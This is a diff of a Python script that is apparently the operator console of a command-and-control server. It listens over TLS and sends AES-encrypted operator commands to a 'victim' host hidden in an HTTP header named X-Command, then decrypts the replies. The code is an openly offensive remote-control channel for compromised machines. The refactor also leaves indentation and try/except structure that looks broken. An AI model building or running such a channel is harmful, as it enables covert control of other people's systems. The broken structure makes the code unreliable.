@@ -99,50 +99,58 @@ def start_server():
         sock.listen(5)  # Start listening for connections
 
         with context.wrap_socket(sock, server_side=True) as ssock:
-            print(f"[*] Listening on {host}:{port}")
+                    print(f"[*] Listening on {host}:{port}")
+                    conn, addr = ssock.accept()  # Accept a new connection
+                    print(f"[+] Connection from {addr}")
 
-            while True:
-                conn, addr = ssock.accept()  # Accept a new connection
-                print(f"[+] Connection from {addr}")
+                    # Handle the client connection in a separate function
+                    handle_client(conn)
 
-                try:
-                    while True:
-                        command = input("Enter command to send (or 'exit' to close connection): ")
-                        if command.strip().lower() == "exit":
-                            print("[*] Closing connection...")
-                            conn.close()
-                            break
+            except ssl.SSLError as ssl_error:
+                print("[-] Failed to connect due to SSL error with self-signed cert:", ssl_error)
+            except Exception as e:
+                print(f"[-] An error occurred: {e}")
 
-                        if not command.strip():
-                            print("[-] Empty command. Skipping...")
-                            continue
-                        
-                        # Encrypt the command
-                        encrypted_command = encrypt_aes_cbc(command)
-                        print(f"[+] Encrypted command: {encrypted_command}")
-                        
-                        http_request = (
-                            f"POST / HTTP/1.1\r\n"
-                            f"Host: victim\r\n"
-                            f"X-Command: {encrypted_command}\r\n"
-                            f"Content-Type: application/x-www-form-urlencoded\r\n"
-                            f"Content-Length: 0\r\n\r\n"
-                        )
-                        conn.sendall(http_request.encode())  # Send the HTTP request
+def handle_client(conn):
+    """Handle the client connection."""
+    try:
+        while True:
+            command = input("Enter command to send (or 'exit' to close connection): ")
+            if command.strip().lower() == "exit":
+                print("[*] Closing connection...")
+                conn.close()
+                break
+            
+            if not command.strip():
+                print("[-] Empty command. Skipping...")
+                continue
+            
+            # Encrypt the command
+            encrypted_command = encrypt_aes_cbc(command)
+            print(f"[+] Encrypted command: {encrypted_command}")
+            
+            http_request = (
+                f"POST / HTTP/1.1\r\n"
+                f"Host: victim\r\n"
+                f"X-Command: {encrypted_command}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 0\r\n\r\n"
+            )
+            conn.sendall(http_request.encode())  # Send the HTTP request
 
-                        response = receive_full_response(conn)  # Receive full response
-                        print(f"[+] Received response:\n{response}")
+            response = receive_full_response(conn)  # Receive full response
+            print(f"[+] Received response:\n{response}")
 
-                        body = extract_body_from_response(response)  # Extract response body
-                        if body:
-                            decrypted_response = decrypt_aes_cbc(body)  # Decrypt the body
-                            print(f"[+] Decrypted response:\n{decrypted_response}")
-                        else:
-                            print("[-] No body found in response.")
-                except Exception as e:
-                    print(f"[-] Error: {e}")
-                finally:
-                    conn.close()  # Close the connection
+            body = extract_body_from_response(response)  # Extract response body
+            if body:
+                decrypted_response = decrypt_aes_cbc(body)  # Decrypt the body
+                print(f"[+] Decrypted response:\n{decrypted_response}")
+            else:
+                print("[-] No body found in response.")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    finally:
+        conn.close()  # Close the connection
 
 if __name__ == "__main__":
     start_server()
